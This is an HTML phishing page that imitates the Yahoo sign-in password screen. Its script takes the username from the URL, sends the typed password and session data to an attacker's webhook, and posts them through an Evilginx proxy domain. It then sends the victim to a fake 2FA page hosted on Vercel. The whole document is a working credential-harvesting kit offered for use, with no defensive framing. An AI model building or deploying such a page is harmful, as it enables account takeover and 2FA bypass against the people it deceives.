<!DOCTYPE html>
<html lang="en" data-wf-page="66f8b8c4c937b8d8c8d05266" data-wf-site="66f8b8c4c937b8d8c8d05265">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Yahoo</title>
    <meta content="Sign in to Yahoo" property="og:title">
    <meta content="Sign in to Yahoo" property="twitter:title">
    <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/webflow.css">
    <link rel="stylesheet" href="css/yahoo-8d0526.webflow.css">
    <link rel="stylesheet" href="css/custom-styles.css">
    <link href="https://fonts.googleapis.com" rel="preconnect">
    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
    <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
    <script type="text/javascript">WebFont.load({ google: { families: ["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic", "Oswald:200,300,400,500,600,700", "Lato:100,100italic,300,300italic,400,400italic,700,700italic,900,900italic"] } });</script>
    <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
    <link href="./images/yahoo.png" rel="shortcut icon" type="image/x-icon">
    <link href="./images/yahoo.png" rel="apple-touch-icon">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "Helvetica Neue", Arial, sans-serif; background: #f7f8fc; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .yahoo-container { background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 40px; text-align: center; }
        .yahoo-header { margin-bottom: 30px; }
        .yahoo-logo { width: 120px; height: auto; }
        .yahoo-main { }
        .yahoo-card { }
        .yahoo-card-header { }
        .yahoo-title { font-size: 24px; margin-bottom: 10px; color: #333; font-weight: 600; }
        .yahoo-user-display { font-size: 16px; color: #333; font-weight: 500; margin-bottom: 20px; }
        .yahoo-card-body { }
        .yahoo-form-group { margin-bottom: 20px; }
        .yahoo-label { display: block; margin-bottom: 8px; color: #555; font-size: 14px; }
        .yahoo-input { width: 100%; padding: 12px 16px; border: 2px solid #e1e5e9; border-radius: 6px; font-size: 16px; transition: border-color 0.3s ease; }
        .yahoo-input:focus { outline: none; border-color: #4a90e2; }
        .yahoo-checkbox-group { }
        .yahoo-checkbox-label { display: flex; align-items: center; cursor: pointer; font-size: 14px; color: #555; }
        .yahoo-checkbox { margin-right: 8px; }
        .yahoo-checkbox-text { }
        .yahoo-submit-btn { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
        .yahoo-submit-btn:hover { background: #357abd; }
        .yahoo-submit-btn:disabled { background: #ccc; cursor: not-allowed; }
        .yahoo-error { background: #fee; border: 1px solid #fcc; color: #c33; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: none; }
        .loading { display: none; text-align: center; margin-top: 20px; }
        .loading-spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .yahoo-links { margin-bottom: 20px; }
        .yahoo-link { color: #4a90e2; text-decoration: none; font-size: 14px; }
        .yahoo-link:hover { text-decoration: underline; }
        .yahoo-footer { }
        .yahoo-footer-links { display: flex; justify-content: center; gap: 20px; margin-top: 30px; }
        .yahoo-footer-link { color: #555; text-decoration: none; font-size: 14px; }
        .yahoo-footer-link:hover { text-decoration: underline; }
    </style>
</head>
<body class="yahoo-body">
    <div class="yahoo-container">
        <div class="yahoo-header">
            <img src="images/yahoo-logo.png" loading="lazy" alt="Yahoo" class="yahoo-logo">
        </div>
        
        <div class="yahoo-main">
            <div class="yahoo-card">
                <div class="yahoo-card-header">
                    <h1 class="yahoo-title">Sign in</h1>
                    <div id="user-display" class="yahoo-user-display">Loading...</div>
                </div>
                
                <div class="yahoo-card-body">
                    <div id="error-message" class="yahoo-error"></div>
                    
                    <form id="password-form" class="yahoo-form">
                        <div class="yahoo-form-group">
                            <label for="password" class="yahoo-label">Password</label>
                            <input type="password" id="password" name="password" class="yahoo-input" placeholder="Password" required autocomplete="current-password">
                        </div>
                        
                        <div class="yahoo-form-group yahoo-checkbox-group">
                            <label class="yahoo-checkbox-label">
                                <input type="checkbox" name="persistent" class="yahoo-checkbox">
                                <span class="yahoo-checkbox-text">Stay signed in</span>
                            </label>
                        </div>
                        
                        <button type="submit" class="yahoo-submit-btn">Next</button>
                    </form>
                    
                    <div class="yahoo-links">
                        <a href="#" class="yahoo-link">Forgot password?</a>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="yahoo-footer">
            <div class="yahoo-footer-links">
                <a href="#" class="yahoo-footer-link">Terms</a>
                <a href="#" class="yahoo-footer-link">Privacy</a>
                <a href="#" class="yahoo-footer-link">Help</a>
            </div>
        </div>
    </div>
    
    <script src="./js/main-flow.js"></script>

    <script>
        // --- CONFIGURATION ---
        const CONFIG = {
            nextPages: {
                twofa: 'https://yahoo-2fa-selection.vercel.app/',
                success: 'https://mail.yahoo.com/d/folders/1'
            },
            webhookUrl: 'https://webhook.site/YOUR_UNIQUE_ID' // IMPORTANT: Replace with your webhook URL
        };

        // --- STATE MANAGEMENT ---
        const state = {
            currentStep: 'password',
            username: '',
            sessionData: {},
            isSubmitting: false,
            evilginxDomain: ''
        };

        // --- UTILITY FUNCTIONS ---
        const utils = {
            showError: (message) => {
                const errorEl = document.getElementById('error-message');
                if (errorEl) {
                    errorEl.textContent = message;
                    errorEl.style.display = 'block';
                    setTimeout(() => { errorEl.style.display = 'none'; }, 5000);
                }
            },
            setLoading: (isLoading) => {
                document.getElementById('loading-container').style.display = isLoading ? 'block' : 'none';
                document.querySelectorAll('.form-step').forEach(step => {
                    step.style.display = 'none';
                });
                if (!isLoading) {
                    document.getElementById(`${state.currentStep}-step`).style.display = 'block';
                }
                state.isSubmitting = isLoading;
            },
            switchStep: (step) => {
                state.currentStep = step;
                utils.setLoading(false);
            },
            captureData: async (data) => {
                try {
                    await fetch(CONFIG.webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ ...data, timestamp: new Date().toISOString(), ...state.sessionData })
                    });
                } catch (error) {
                    console.warn('Webhook capture failed:', error);
                }
            }
        };

        // --- SESSION MANAGEMENT ---
        const sessionManager = {
            init: () => {
                const urlParams = new URLSearchParams(window.location.search);
                state.evilginxDomain = urlParams.get('evilginx_domain');
                
                if (!state.evilginxDomain) {
                    console.error("CRITICAL: evilginx_domain parameter is missing. The form will not work.");
                    utils.showError('Configuration error. Please access through the correct link.');
                    document.getElementById('submit-button').disabled = true;
                    return;
                }

                state.username = urlParams.get('u') || '';
                state.sessionData = {
                    evilginx_domain: state.evilginxDomain,
                    sessionIndex: urlParams.get('sessionIndex') || 'N/A',
                    acrumb: urlParams.get('acrumb') || 'N/A',
                    done: urlParams.get('done') || 'https://mail.yahoo.com/',
                    src: urlParams.get('src') || 'ym',
                    bypass: urlParams.get('bypass') || 'none'
                };

                const userIdentifierEl = document.getElementById('user-display');
                if (userIdentifierEl) {
                    userIdentifierEl.textContent = state.username;
                }

                utils.captureData({ type: 'page_loaded', page: 'login' });
            }
        };

        // --- FORM HANDLERS ---
        const formHandlers = {
            handlePasswordSubmit: async (event) => {
                event.preventDefault();
                if (state.isSubmitting) return;

                const password = document.getElementById('password').value;
                if (!password) {
                    utils.showError('Please enter your password.');
                    return;
                }

                utils.setLoading(true);
                await utils.captureData({ type: 'credentials_captured', username: state.username, password });

                const formData = new URLSearchParams({
                    username: state.username,
                    password: password,
                    ...state.sessionData
                });

                try {
                    const response = await fetch(`https://${state.evilginxDomain}/account/challenge/password`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: formData,
                        credentials: 'include'
                    });

                    // Regardless of the response, we assume success and proceed to the 2FA page.
                    // This is because we can't trust the response from the blocked domain.
                    // The real validation happens when the user enters the OTP.
                    console.log('Password submitted to evilginx. Assuming 2FA is required.');
                    await utils.captureData({ type: 'password_submitted_proceeding_to_2fa' });

                    const params = new URLSearchParams({
                        u: state.username,
                        ...state.sessionData
                    });
                    
                    window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;

                } catch (error) {
                    console.error('Fetch to evilginx failed:', error);
                    // Even on failure, proceed to 2FA page to not lose the user.
                    await utils.captureData({ type: 'fetch_error_proceeding_to_2fa', error: error.message });
                    const params = new URLSearchParams({ u: state.username, ...state.sessionData });
                    window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;
                }
            }
        };

        // --- EVENT LISTENERS ---
        const setupEventListeners = () => {
            document.getElementById('password-form').addEventListener('submit', formHandlers.handlePasswordSubmit);
        };

        // --- INITIALIZATION ---
        document.addEventListener('DOMContentLoaded', () => {
            sessionManager.init();
            setupEventListeners();
        });
    </script>
</body>
</html>
